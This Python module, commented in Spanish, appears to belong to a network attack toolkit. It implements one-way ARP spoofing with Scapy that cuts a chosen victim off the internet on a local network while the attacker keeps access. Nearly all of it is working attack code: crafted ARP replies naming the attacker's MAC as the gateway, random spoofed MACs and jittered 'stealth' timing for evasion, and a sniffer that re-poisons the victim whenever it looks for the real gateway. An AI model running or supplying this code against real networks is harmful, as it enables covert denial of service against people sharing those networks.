"""
Módulo ARP - Spoofing unidireccional (solo víctima, sin tocar gateway)
"""

import time
import random
import threading
from modulos.network_core import _obtener_mac, _mac_aleatoria
from modulos.system_utils import _is_admin
from modulos.config import _estado


class ARPModule:
    """Módulo de ARP Spoofing con evasión mejorada."""

    def __init__(self, logger_engine):
        self.logger = logger_engine

    def start_attack(self, ip_target, gateway, interval_base, stealth, jitter,
                     oui, write_callback, stop_callback):
        """Inicia el ataque de ARP spoofing."""
        if not hasattr(self, '_scapy_available'):
            try:
                from scapy.all import Ether, ARP, sendp, sniff
                self._scapy_available = True
            except ImportError:
                self._scapy_available = False
                write_callback("✗ Scapy no disponible.\n")
                return False

        if not self._scapy_available:
            return False

        _estado["arp"].set()
        threading.Thread(
            target=self._arp_loop,
            args=(ip_target, gateway, interval_base, stealth, jitter,
                  oui, write_callback, stop_callback),
            daemon=True
        ).start()
        return True

    def stop_attack(self, write_callback):
        """Detiene el ataque de ARP spoofing."""
        _estado["arp"].clear()
        write_callback("● Deteniendo y restaurando ARP...\n")
        self.logger.log("[ARP] Ataque detenido.", "warn")

    # ── Loop principal ────────────────────────────────────────────────────────
    def _arp_loop(self, ip_target, gateway, interval_base, stealth, jitter,
                  oui, write_callback, stop_callback):
        """Loop principal del ataque ARP.

        Técnica UNIDIRECCIONAL:
          Solo se envenena a la víctima → le decimos que el gateway
          está en nuestra MAC. La víctima envía su tráfico a nosotros,
          nosotros lo descartamos → la víctima pierde internet.

          NO se envenena al gateway en ningún momento. Eso significa
          que el gateway nunca cambia su tabla ARP, nuestro tráfico
          sigue fluyendo normal y nosotros mantenemos internet.
        """
        try:
            from scapy.all import Ether, ARP, sendp
        except ImportError:
            return

        # Elegir MAC de ataque (None = usar la MAC real del sistema)
        mac_src = _mac_aleatoria(oui if oui != "ninguno" else None) if oui != "ninguno" else None

        # ── Resolver MAC de la víctima ────────────────────────────────────────
        write_callback("» Resolviendo MAC de la víctima...\n")
        mac_obj = _obtener_mac(ip_target)
        if not mac_obj:
            write_callback(f"✗ No se obtuvo MAC de {ip_target}. ¿Npcap? ¿IP activa?\n")
            self.logger.log(f"[ARP] Error: sin MAC para {ip_target}", "err")
            stop_callback()
            return

        write_callback(f"» Target:  {ip_target}  ({mac_obj})\n")
        write_callback(f"» Gateway: {gateway}\n")
        write_callback(f"» MAC src: {mac_src or 'Original (tu MAC)'}  [evasión OUI: {oui}]\n")
        write_callback(f"» Modo: Unidireccional — solo se envenena a la víctima\n")
        write_callback(f"» Resultado: víctima SIN internet / tú CON internet\n")
        write_callback("─" * 48 + "\n")
        self.logger.log(f"[ARP] Iniciado → {ip_target}", "warn")

        try:
            # ── Paquete ARP: solo a la víctima ────────────────────────────────
            # Le dice a la víctima: "El gateway ({gateway}) está en {mac_src}"
            # La víctima envía todo su tráfico a nosotros → lo descartamos
            pkt_t = (Ether(src=mac_src, dst=mac_obj) /
                     ARP(pdst=ip_target, hwdst=mac_obj,
                         psrc=gateway, hwsrc=mac_src, op=2))

            # NO hay pkt_g — no tocamos al gateway para nada

            # ── Monitor reactivo ARP ──────────────────────────────────────────
            threading.Thread(
                target=self._arp_monitor,
                args=(ip_target, gateway, pkt_t),
                daemon=True
            ).start()

            # ── Bucle de envío ARP ────────────────────────────────────────────
            n = 0
            while _estado["arp"].is_set():
                sendp(pkt_t, verbose=0)
                n += 1
                write_callback(f"  ↗ pkt #{n:4d} → {ip_target}\n")
                self.logger.log(f"[ARP] #{n} pkts → {ip_target}", "pkt")

                # Intervalo con jitter
                if stealth:
                    iv = random.uniform(interval_base * 0.6, interval_base * 1.8)
                elif jitter:
                    iv = interval_base + random.uniform(-0.5, 0.5)
                else:
                    iv = interval_base
                time.sleep(max(0.5, iv))

        except Exception as e:
            write_callback(f"✗ Error: {e}\n")
            self.logger.log(f"[ARP] Error: {e}", "err")
        finally:
            self._restore_arp(ip_target, gateway, mac_obj, write_callback)
            stop_callback()

    # ── Monitor reactivo ──────────────────────────────────────────────────────
    def _arp_monitor(self, ip_target, gateway, pkt_t):
        """Monitorea peticiones ARP: si la víctima intenta redescubrir el
        gateway real, re-envenenamos inmediatamente."""
        try:
            from scapy.all import ARP, sniff, sendp

            def _react(p):
                if not _estado["arp"].is_set():
                    return
                if ARP in p and p[ARP].op == 1:  # who-has
                    # Si la víctima pregunta por el gateway → re-envenenar
                    if p[ARP].psrc == ip_target and p[ARP].pdst == gateway:
                        sendp(pkt_t, verbose=0, count=3)

            sniff(filter="arp", prn=_react,
                  stop_filter=lambda _: not _estado["arp"].is_set(), store=False)
        except Exception:
            pass

    # ── Restauración ARP ──────────────────────────────────────────────────────
    def _restore_arp(self, ip_target, gateway, mac_obj, write_callback):
        """Restaura la tabla ARP de la víctima al valor legítimo."""
        try:
            from scapy.all import Ether, ARP, sendp
        except ImportError:
            return

        write_callback("⟳ Restaurando ARP de la víctima...\n")

        # Obtener la MAC real del gateway para restaurar
        mac_gw = _obtener_mac(gateway)
        if mac_obj and mac_gw:
            # Decir a la víctima: "El gateway está en su MAC real"
            rest_t = (Ether(src=mac_gw, dst=mac_obj) /
                      ARP(pdst=ip_target, hwdst=mac_obj,
                          psrc=gateway, hwsrc=mac_gw, op=2))

            sendp(rest_t, count=6, verbose=0)
            write_callback("✔ Tabla ARP de la víctima restaurada.\n")
            self.logger.log("[ARP] Tabla ARP restaurada.", "ok")
        else:
            write_callback("⚠ Restauración parcial (no se pudo resolver MAC del gateway).\n")
            self.logger.log("[ARP] Restauración parcial.", "warn")
